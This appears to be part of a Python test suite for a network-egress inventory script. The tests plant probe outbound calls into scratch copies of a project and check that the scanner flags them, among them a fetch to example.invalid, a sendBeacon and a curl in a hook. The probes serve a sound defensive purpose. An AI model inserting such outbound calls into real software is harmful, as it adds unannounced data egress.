                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the route is typed through its own class body's one def and read", rel)

    def test_a_send_call_that_reaches_no_definition_the_census_reads_is_refused_with_a_reason_true_for_it(self):
        """routes_of since the seventh round's review (the (r) plants, in probe modules of their own), each a SERVED line at the
        call's line whose reason is true for its shape. A bare `_send` call reaches the `_send` the nearest scope around it binds,
        as Python looks the name up, and never the module's past it (_bare_send_binding): calls in do_GET, which binds `_send` by a
        parameter (bfp), a nested def (bfd) or a loop target (bfl) beside a module-level def writing application/json, and a call
        of a def do_GET holds in a file with no other binding of `_send` (clo), are each refused naming the function and the
        binding; and in one module (probe_bfx.py, A_BARE) every other form a method binds it by, each named: a with target, an
        assignment, augmented or annotated, an annotation alone, a walrus (in the method, and in a comprehension in it), a del, an
        import, an except name, a match capture, a class statement, a comprehension's target and a lambda's parameter around the
        call, an assignment under a nonlocal declaration in a nested function, and an
        enclosing function's assignment; and a call in a class body that binds `_send` (bcb). The same module holds five calls
        Python sends to the module's def, which the census types (application/json, so no route and no line): a global
        declaration with no binding beside it in a function whose enclosing function binds `_send` (bgs), a call in a nested def's
        header (bgh), in a comprehension's first iterable (bgi) and in a lambda's default (bgl), each beside a binding of the
        scope the call does not stand in, and a comprehension's target outside its comprehension (bgq). A call that reaches no
        definition the census reads, in a file that names `_send` besides its calls, is refused saying why: a call through self in
        a subclass whose base class in the same file binds `_send` (inh: its own class body does not bind it, inherited or set at
        run time), a call through super() in a file whose class binds it (sup: an object other than self), a call through an
        attribute outside any class body (since the seventh round's review, whose reason for such a call named a
        class body: vmsf through self and yhms through another object in a module function of a file whose class binds `_send`,
        modh through self in one whose module binds it), and a bare call in a file whose one `_send` is a method (bnm: no scope
        the bare call looks it up in binds it, the module included). A file that names `_send` nowhere but as its calls' called
        name keeps "a definition this file does not hold" (zsb, the (g) case's). An attribute store of `_send` at module level,
        `Handler._send = f`, which the class's calls reach at run time, is refused at its place as a reference to `_send` other
        than a call, as a read or a setattr string is (wats, since the seventh round's review). At the reviewed head the calls typed through a
        module def are silent (application/json, no route), wats is silent, and every other plant here says the file does not
        hold the definition. The arm whose removal reds each: routes_of's check
        of the scopes around a bare call for every refused bare call (each typed through the module's def and silent, clo, bcb and
        bnm then the no-scope reason); in _binding_forms each form's record for its plant (the parameter for bfp and bfy, the def
        statement for bfd and clo, the class statement for bfc, the import for bfi, the except name for bfe, the match capture for
        bfm, and each target's name for its plant, then "a store"), the comprehension's parts walked for bfj, and its targets left
        to it for bgq; in _call_scopes the lambda's body alone for bgl, the comprehension's first iterable left out for bgi, the
        header left out for bgh, and a class body counted only as the call's own scope for bnm; the global declaration's stop for
        bgs; the file-wide name check (_names_send) for inh, sup and bnm (each then saying the file does not hold the
        definition); the class-body condition of the reach reason for vmsf, yhms and modh (each then "an object other than self");
        and the attribute store's read as a reference for wats (then silent)."""
        self.assertARefused(("(r)",))
        for tag, _, _, forms in A_BARE:
            if forms is None:
                with self.subTest(plant="(r) a bare _send call Python sends to the module's def (%s)" % tag):
                    self.assertEqual([ln for ln in self.out.splitlines() if "%s:%d " % (_a_rel("bfx"), self.at[tag]) in ln], [],
                                     "the call reaches the module's def, which the census types (application/json): no line")

    def test_the_two_limits_hold_their_witnesses_and_no_refused_text_is_scanned(self):
        """The two limits the seventh round states, each held by a witness at its outcome, and what no reader scans at the fix. An
        override of `_send` in a subclass another file defines (kernel/probe_lox.py subclasses kernel.py's Handler and writes
        its third parameter) is not read: the call is typed through its own class body's definition, its page's fetch listed at
        its line, and no line names the override (a same-file override in a class a function body defines, probe_lfb's, is
        (g)'s, since (g) counts that class body). A stream a definition reaches
        through no name it spells is not read: probe_lgs's end_headers writes more text through a module global holding the
        socket while its `_send` makes only the calls (h) reads, so the route is read, its page's fetch listed, and the other
        text is never scanned. No header walrus's value, no module function or constant a scope shadows, no page of a refused
        route and no extra text a (h) road writes is a site at the fix."""
        for plant, tag, rel in A_READ[3:]:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the route is typed through its own class body's definition and read", rel)
        with self.subTest(plant="limits: no line names an override or a witness's refusal"):
            self.assertEqual([ln for ln in self.out.splitlines() if _a_rel("lox") in ln or ln.startswith("SERVED " + _a_rel("lgs"))], [])
        with self.subTest(plant="no text a reader refuses or does not reach is a site"):
            self.assertEqual([ln for ln in self.out.splitlines() if SITE_LINE.match(ln) and any(m in ln for m in A_UNREAD_MARKS)], [])

    def test_a_call_a_receiver_derives_through_has_its_arguments_read_as_text(self):
        """A receiver or a container that derives through a call of a builtin or of an import (a base with no page text of its
        own) has that call's arguments read as text, as a bare name is read, in a probe module of its own whose `json`, `dict`
        and `list` nothing rebinds: `dict(_PROBE_CBD).get("k", "")` (the tree's own spelling, kernel.py's
        `dict(_PANE_ORDER).get(...)` in _pane_label), `list(_PROBE_CBL)[0]` and `json.loads(json.dumps(_PROBE_CBJ))[0]`, each
        constant's fetch UNCLASSIFIED at its line; and, one for each descent of _chain_args (the seventh round's review), a
        method call on the builtin's call (`dict(_PROBE_CCA).copy().get("k")`: an attribute's value, then the call's receiver), a
        `**` argument (`dict(**_PROBE_CCK)["k"]`: a keyword's value) and a BoolOp inside the chain
        (`(q or dict(_PROBE_CCB)).copy().get(k)`, in a page function whose q and k are parameters), each read the same way. At the
        reviewed head each is silent: _base found the base exempt and receiver read none of the call's arguments. The arm whose
        removal reds all six: receiver's read of the arguments of the calls an exempt base derives through (_chain_args); and
        within _chain_args, its attribute and subscript arm reds cca and ccb, its call arm's descent to the receiver cca and ccb,
        its call arm's keyword values cck, and its BoolOp arm ccb."""
        for plant, tag, rel in A_CALL_BASE:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the call's argument is read as text", rel)

    def test_a_parameter_a_followed_call_omits_is_read_from_its_default(self):
        """The default of each parameter of a followed function that the call omits is read as the call's argument would be (the
        tree's too-large page, `_too_large_page(msg, name, q, route="/file")`, is called without `route`, and the default is page
        text), in the scope the def statement runs in, in a probe module of its own
        (kernel/probe_zdf.py): a module function's positional default (zdp), a keyword-only default through a module constant (zdk),
        a method's default (zdm), a nested def's default through the enclosing function's local (zdn), and the same called from
        another nested function that binds the name too (zdo, the default read in the enclosing function's scope, where its def
        statement runs), each default's fetch UNCLASSIFIED at its line. A default the reader cannot read is refused by name: a
        method's default naming a name the class body binds (zdc; the census does not read a class body as a scope) and a call the
        pass does not follow (zdu, a module constant's lambda called). A default the call passes is not read (zds, its fetch no
        site). At the reviewed head every one is silent: a parameter was a value slot and its default never read. The arm whose
        removal reds each: the read of the defaults in the module-function arm for zdp, zdk and zdu, in the method arm for zdm and
        zdc, and in the nested-def arm for zdn and zdo; the scope a nested def's defaults run in for zdo (without it the calling
        function's own binding is read, a text with no fetch); the class-body check for zdc (then the reasonless line, the class
        attribute bound nowhere the module's scope reads); and the check that the call passes the parameter for zds (its fetch
        then a site)."""
        for plant, tag, rel in A_DEFAULT_READ:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the default of a parameter the call omits is read as its argument", rel)
        self.assertARefused(("(p)",))
        with self.subTest(plant="(p) a default the call passes"):
            self.assertEqual([ln for ln in self.out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("zdsx") in ln], [],
                             "the call passes the parameter: its default is not read")

    def test_the_served_texts_own_sites_are_rowed_or_computed_and_its_stylesheets_named(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        path = os.path.join(ROOT, KERNEL_PATH)
        for tool, needle in SERVED_ROWED:
            n = _line_of(path, needle)
            self.assertListed(out, r"kernel/kernel\.py:%d  %s  .*  in -  -> local-kernel$" % (n, re.escape(tool)), "the served text's %s at its own line, on the row" % tool)
        for needle in SERVED_COMPUTED:
            n = _line_of(path, needle)
            self.assertListed(out, r"kernel/kernel\.py:%d  fetch  .*  in -  -> \(browser-computed-url\)$" % n, "a route literal the caller passes: computed")
        sheets = PANE_CSS.findall(KERNEL)
        self.assertEqual(len(sheets), 4, "the pane stylesheets the pages read at run time, by content: %r" % sheets)
        for name in sheets:
            self.assertListed(out, r"kernel/kernel\.py:\d+  served-file  ui/webview/%s  -> \(a stylesheet a served page reads: named, not scanned\)$" % re.escape(name))
        expected = _expected()
        self.assertEqual((expected["per_key"]["kernel/kernel.py:WebSocket"], expected["per_key"]["kernel/kernel.py:window.open"], expected["per_key"]["kernel/kernel.py:clients.openWindow"]), (2, 1, 1))

    def test_the_served_pass_removed_leaves_the_plants_silent_and_the_rows_stale(self):
        """M21: the served pass replaced by pass in a scratch copy of the script, with the fetch and the beacon planted."""
        self.replace("kernel/kernel.py", BOOT_ANCHOR, BOOT_ANCHOR + 'fetch("https://example.invalid/probe");\n')
        self.replace("kernel/kernel.py", SETTINGS_ANCHOR, SETTINGS_PLANT + SETTINGS_ANCHOR)
        self.replace(INVENTORY, SERVED_CALL, SERVED_OFF)
        rc, out, _ = inventory(scope_copy())
        self.assertFalse(unclassified(out), "without the pass the served text is outside the scan: the plants are silent (the defect): %r" % unclassified(out))
        self.assertFalse([ln for ln in out.splitlines() if "  sendBeacon  " in ln or "example.invalid/probe" in ln])
        expected = _expected()
        self.assertRefused(rc, out, "STALE ROW kernel/kernel.py:WebSocket names no site", "STALE ROW kernel/kernel.py:window.open names no site",
                           "STALE ROW kernel/kernel.py:clients.openWindow names no site",
                           "COUNTS per_key kernel/kernel.py:fetch: the committed count is %d, this run found None" % expected["per_key"]["kernel/kernel.py:fetch"])

    def test_the_command_line_over_a_copy_carrying_the_plants_prints_the_pass(self):
        """The pass's equality, executed (the fifth round of the review, 2026-09-23; fresh-1, tests-2, extra6-5, extra7-5): the file
        run as the command line runs it (_command_line), over the scope copy with kernel/kernel.py carrying exactly the pass's plants
        (the text _served_text writes, the text the pass parses), exits 1 and prints the pass's stdout byte for byte. The pass starts
        from the tree's one derivation (_tree), so this one case holds the tree derivation, the splice and the entry's exit code
        against a real run: a scan() route filter, a scan() that drops a served file's sites, a Result field the splice does not
        carry, a splice line dropped and a lost exit code are each red here (M35 to M39 in the round's record). One full scan, in a
        child. A case of its own and not a shared run's member: its import plant would join the credentials run's IMPORT set."""
        self.plant(KERNEL_PATH, _served_text(KERNEL))
        for rel, text in A_FILES:   # the seventh round's probe modules, the files the pass scans beside kernel/kernel.py
            self.plant(rel, text)
        self.assertCommandLine(scope_copy(), self.rc, self.out, timeout=300)


class TheChatMediaRoadIsRowed(_Scope):
    """A rendered message's media on the web dashboard is a road (the fourth round, tests-1): the pipeline's one line on a
    message's pictures before the browser fetches them, `mdImgPostPass(clean)` in md() and in userMd(), is the row's site (two
    lines, keyed ui/webview/render.ts:mdImgPostPass, through a JS entry whose lookbehind keeps the definition in preview.ts out),
    and the table's row states the render as the trigger, whatever cookies that browser sends to that host and no Referer to any other origin as what is
    sent (save an inline svg's paint references, whose request can carry the dashboard's address with the serve token in its
    Referer, one text with the section's sentence), and no switch.
    The executed witness is ui/webview/chat-media-loads-browser.test.ts (the request events of a page served under the
    dashboard's headers, and the editor CSP scene), which skips without a browser; tests/test_security_price_feed.py holds the
    section's sentence and the row's cells to the same words."""

    def test_the_rows_two_sites_are_the_pipelines_post_pass_lines_and_the_table_has_the_row(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        lines = [i + 1 for i, ln in enumerate(_lines(os.path.join(ROOT, "ui", "webview", "render.ts"))) if "mdImgPostPass(clean);" in ln]
        self.assertEqual(len(lines), 2, "md() and userMd() each run the post-pass once, by content: %r" % lines)
        for n in lines:
            self.assertListed(out, r"ui/webview/render\.ts:%d  mdImgPostPass  mdImgPostPass\(clean\);.*  in -  -> chat-media$" % n)
        self.assertEqual(len([ln for ln in out.splitlines() if ln.endswith("-> chat-media")]), 2, "the road's sites are those two lines")
        expected = _expected()
        self.assertEqual((expected["per_road"]["chat-media"], expected["per_key"]["ui/webview/render.ts:mdImgPostPass"]), (2, 2))
        rc2, table, err = tree_run("--table")
        self.assertEqual(rc2, 0, err[-1500:])
        row = next((r for r in table.splitlines() if r.startswith("| %s | " % CHAT_MEDIA_LABEL)), None)
        self.assertTrue(row, "the table has the road: %r" % CHAT_MEDIA_LABEL)
        cells = [c.strip() for c in row.strip().strip("|").split(" | ")]
        self.assertEqual(len(cells), 5, row[:120])
        self.assertEqual(cells[1], "ui/webview/render.ts (`mdImgPostPass`)", "the where cell is derived from the sites")
        self.assertTrue(cells[2].startswith("the render of a message on the web dashboard, and nothing else: no click, no gate, no setting"), cells[2][:160])
        for phrase in ("a session's reply (`md`", "your own message (`userMd`", "a postal body (`md` in `renderPostalService`", "`video` (src, poster)", "an inline svg's `image`",
                       "the editor extension's webviews block these loads by their CSP"):
            self.assertIn(phrase, cells[2], "the trigger cell names the population and the editor's block")
        for phrase in (CHAT_MEDIA_COOKIES, "no Referer to any other origin (every page the kernel serves carries `Referrer-Policy: same-origin`)", CHAT_MEDIA_PAINT):
            self.assertIn(phrase, cells[3], "the sent cell: the host the URL names, whatever cookies that browser sends to that host, no Referer to any other origin, and "
                          "the one case whose request can carry the dashboard's address with the serve token in its Referer, an inline svg's paint references")
        for words in CHAT_MEDIA_COOKIES_WITHDRAWN:
            self.assertNotIn(words, cells[3], "the withdrawn cookie words are absent from the sent cell: %r" % words)
        self.assertNotIn(CHAT_MEDIA_NO_TOKEN_WITHDRAWN, cells[3], "the sent cell no longer claims that no token rides: a paint reference's Referer can carry the serve token")
        self.assertIn(PAINT_TOKEN_CONDITION, cells[3], "the token half is conditioned (fresh-2): the full page address with the serve token only "
                      "when the page's own address carries ?token=, not from every framed dashboard page")
        self.assertEqual(cells[4], "none: no setting gates a message's media (the gear's Pictures from the web in files list gates a viewed file's figures, not the chat's)")
        self.assertTrue(os.path.isfile(os.path.join(ROOT, "ui", "webview", "chat-media-loads-browser.test.ts")), "the executed witness is in the tree")

    def test_the_ledger_entrys_census_paragraph_carries_the_paint_reference_clause(self):
        """The entry's census paragraph is the second home of the road's prose (the body quotes it byte for byte and the owner reads
        it to decide the upstream offer), so it carries the paint-reference clause the section and the sent cell carry, one text,
        and does not describe the road's requests as carrying no Referer without it (the reviewer's ruling of 2026-09-23 after the
        executed fact check). Read from the paragraph that describes the road, outside the table block, which carries the cell."""
        if not os.path.isdir(os.path.join(ROOT, "upstream")):
            self.skipTest("no upstream/ ledger in this tree (the ledger is the fork's)")
        with open(os.path.join(ROOT, LEDGER), encoding="utf-8") as f:
            text = f.read()
        prose = text.split(BEGIN, 1)[0] + text.split(END, 1)[-1]
        paragraphs = [p for p in prose.split("\n") if "the chat-media road (a rendered message's media)" in p]
        self.assertEqual(len(paragraphs), 1, "one paragraph of %s describes the chat-media road outside the table block" % LEDGER)
        self.assertIn(CHAT_MEDIA_PAINT, paragraphs[0], "the entry's census paragraph carries the paint-reference clause the section and "
                      "the sent cell carry: an inline svg's paint references are the one case whose request can carry the dashboard's "
                      "address with the serve token in its Referer")
        self.assertIn(CHAT_MEDIA_COOKIES, paragraphs[0], "the entry's census paragraph carries the cookie clause the section and the sent cell carry")
        self.assertNotIn(CHAT_MEDIA_COOKIES_WITHDRAWN[0], paragraphs[0], "the withdrawn cookie words are absent from the census paragraph")

    def test_the_row_dropped_and_the_lookbehind_removed_leave_the_sites_unclassified_and_the_definition_a_site(self):
        """M22: the T row deleted and the JS entry's lookbehind removed in one scratch copy of the script."""
        self.replace(INVENTORY, CHAT_MEDIA_ROW, "")
        self.replace(INVENTORY, MD_IMG_ENTRY, MD_IMG_ENTRY_NO_LOOKBEHIND)
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "UNCLASSIFIED", "TABLE ROADS names chat-media, a road with no site")
        named = unclassified(out)
        for n in (i + 1 for i, ln in enumerate(_lines(os.path.join(ROOT, "ui", "webview", "render.ts"))) if "mdImgPostPass(clean);" in ln):
            self.assertIn("ui/webview/render.ts:%d" % n, named, "without the row the pipeline's line has no road")
        self.assertIn("ui/webview/preview.ts:%d" % _line_of(os.path.join(ROOT, "ui", "webview", "preview.ts"), "export function mdImgPostPass("), named,
                      "without the lookbehind the definition line is a site")


class TheGitHubButtonsHrefWriteIsListedByContent(_Scope):
    """The file viewer's GitHub button writes an address romp composes into an anchor's href (the fourth round, extra7-1): the
    listing names that write as a dom-load line, pinned here by the statement's content and the file, never by a line number; a
    deleted write moves the class count, and an opener added beside it moves the clicked-link road's count and the file's key."""

    def test_the_write_is_one_dom_load_line_at_its_own_line(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        found = GITHUB_LISTING.findall(out)
        self.assertEqual(len(found), 1, "one dom-load line carries the button's three-statement write: %r" % found)
        self.assertEqual(int(found[0]), _line_of(os.path.join(ROOT, "ui", "webview", "file-view.ts"), GITHUB_WRITE), "listed at the write's own line")

    def test_the_write_deleted_moves_the_class_count(self):
        """M23: the statement removed from a scratch copy of the viewer."""
        self.replace("ui/webview/file-view.ts", GITHUB_WRITE, "")
        rc, out, _ = inventory(scope_copy())
        self.assertFalse(GITHUB_LISTING.findall(out))
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS classes browser-dom-loads: the committed count is %d, this run found %d"
                           % (expected["classes"]["browser-dom-loads"], expected["classes"]["browser-dom-loads"] - 1))

    def test_an_opener_beside_the_write_moves_the_roads_count_and_the_files_key(self):
        """M24: a window.open appended to the write's line in a scratch copy of the viewer: a site of the clicked-link road, keyed
        on the file, beside the dom-load line the write stays."""
        self.replace("ui/webview/file-view.ts", GITHUB_WRITE, GITHUB_WRITE + ' window.open(url, "_blank");')
        n = _line_of(os.path.join(scope_copy(), "ui", "webview", "file-view.ts"), GITHUB_WRITE)
        rc, out, _ = inventory(scope_copy())
        both = _listed(out, "ui/webview/file-view.ts:%d  " % n)
        self.assertTrue(any("  dom-load  attribute write  " in ln for ln in both), "the write is still a dom-load line (its head now carries the opener too): %r" % both)
        self.assertTrue(any("  window.open  " in ln and ln.endswith("-> clicked-link") for ln in both), "and the line is a site of the road, by the file's row: %r" % both)
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS per_key ui/webview/file-view.ts:window.open: the committed count is %d, this run found %d"
                           % (expected["per_key"]["ui/webview/file-view.ts:window.open"], expected["per_key"]["ui/webview/file-view.ts:window.open"] + 1),
                           "COUNTS per_road clicked-link: the committed count is %d, this run found %d" % (expected["per_road"]["clicked-link"], expected["per_road"]["clicked-link"] + 1))
        self.assertFalse(unclassified(out), "the row places the opener; the counts are what name it: %r" % unclassified(out))


class TheKindOfReadsADottedHooksShebang(_Scope):
    """kind_of's early return for a dotted name is gone (the fourth round, fresh-2): a hook named with an extension outside the
    five (a .bash) falls through to the shebang read and is scanned; the shared walk run's hooks case holds the plant listed, and
    this case holds the mutation: the early return restored, the hook is skipped by kind and its curl is silent."""

    def test_the_early_return_restored_skips_the_dotted_hook_by_kind(self):
        """M25."""
        self.plant("hooks/probe.bash", BASH_HOOK_TEXT)
        self.replace(INVENTORY, SHEBANG_LINE, EARLY_RETURN + SHEBANG_LINE)
        rc, out, _ = inventory(scope_copy())
        self.assertNotIn("hooks/probe.bash:2", unclassified(out), "under the early return the .bash hook is no file of the walk (the defect)")
        self.assertFalse(_listed(out, "hooks/probe.bash:"))
        rc2, out2, _ = tree_run()
        self.assertEqual(summary(out)["skipped"], summary(out2)["skipped"] + 1, "the hook is counted as skipped by kind, which no gate reads")


class TheTableIsTheLedgers(_Scope):
    """--table prints the ledger's table from the sites: one row per road, the .svg tab row (named and not counted), the local
    row, one row per class this scan cannot see, the paint row (named and not counted) and the row of the class it cannot see
    at all (named, not counted); and the ledger entry carries exactly that output between its two marker lines, so a
    hand-written cell cannot survive."""

    def test_the_table_has_a_row_per_road_the_local_row_the_four_classes_and_the_unseen_row(self):
        rc, table, err = tree_run("--table")
        self.assertEqual(rc, 0, err[-1500:])
        expected = _expected()
        lines = table.strip().splitlines()
        self.assertEqual(lines[0], "| road | where | trigger and cadence | what is sent and to where | off switch |")
        self.assertEqual(lines[1], "|---|---|---|---|---|")
        rows = lines[2:]
        self.assertEqual(len(rows), expected["roads"] - expected["local_roads"] + 1 + 1 + 4 + 1 + 1,
                         "a row per road, the .svg tab row (named, not counted), the local row, the four counted classes, the paint row (named, "
                         "not counted), the unseen row")
        for r in rows:
            self.assertEqual(len(r.split(" | ")), 5, r[:120])
        self.assertTrue(rows[-8].startswith("| %s | not counted: " % SVG_TAB_LABEL), "the .svg tab row stands after the roads, named and not counted")
        self.assertTrue(rows[-7].startswith("| local, set aside and counted (local) | %d sites on the %d local roads" % (expected["local_sites"], expected["local_roads"])))
        self.assertTrue(rows[-2].startswith("| %s | not counted: " % PAINT_ROW_LABEL), "the paint row stands beside the browser-dom-loads row, named and not counted")
        self.assertTrue(rows[-1].startswith("| %s | not counted: " % UNSEEN_LABEL), "the last row is the class the scan cannot see, named and not counted")
        self.assertIn("| an external program started whose far end its arguments do not show (not derivable by this scan) | %d sites, by program:" % expected["classes"]["external-program"], table)
        self.assertIn("| a browser request whose URL is computed at run time (not derivable by this scan) | %d sites:" % expected["classes"]["browser-computed-url"], table)
        self.assertIn("| the browser DOM's own loads (not derivable by this scan) | %d lines in" % expected["classes"]["browser-dom-loads"], table)
        self.assertIn("| a program supplied at run time (not derivable by this scan) | kernel/credentials.py `run_helper`; kernel/kernel.py `_watch_run` (2 sites) |", table)
        browser = next(r for r in rows if r.startswith("| a viewed file's pictures from the web (browser) |"))
        self.assertIn("| ui/webview/figure-gate.ts (`figureHosts`); ui/webview/preview.ts (`Image`) |", browser, "the where cell is derived from the sites")
        self.assertNotIn("Copy image", browser, "extra8-4: the lightbox re-fetch reads the kernel's own file URL and is not a member")
        for cell in table.splitlines():
            self.assertNotIn(chr(0x2014), cell)
            self.assertNotIn(chr(0x2013), cell)

    def test_the_ledger_carries_the_scripts_table_between_its_markers(self):
        if not os.path.isdir(os.path.join(ROOT, "upstream")):
            self.skipTest("no upstream/ ledger in this tree (the ledger is the fork's)")
        path = os.path.join(ROOT, LEDGER)
        self.assertTrue(os.path.isfile(path), "the ledger entry %s exists" % LEDGER)
        with open(path, encoding="utf-8") as f:
            text = f.read()
        self.assertTrue(BEGIN in text, "%s carries the marker line %s (run python3 %s --table and paste its output between the two markers)" % (LEDGER, BEGIN, INVENTORY))
        self.assertTrue(END in text, "%s carries the marker line %s" % (LEDGER, END))
        block = text.split(BEGIN, 1)[1].split(END, 1)[0].strip()
        rc, table, err = tree_run("--table")
        self.assertEqual(rc, 0, err[-1500:])
        if block != table.strip():
            diff = "\n".join(list(difflib.unified_diff(block.splitlines(), table.strip().splitlines(), "the ledger's block", "--table", lineterm=""))[:40])
            self.fail("the ledger's table is not the script's output; regenerate the block with python3 %s --table:\n%s" % (INVENTORY, diff))


if __name__ == "__main__":
    unittest.main()
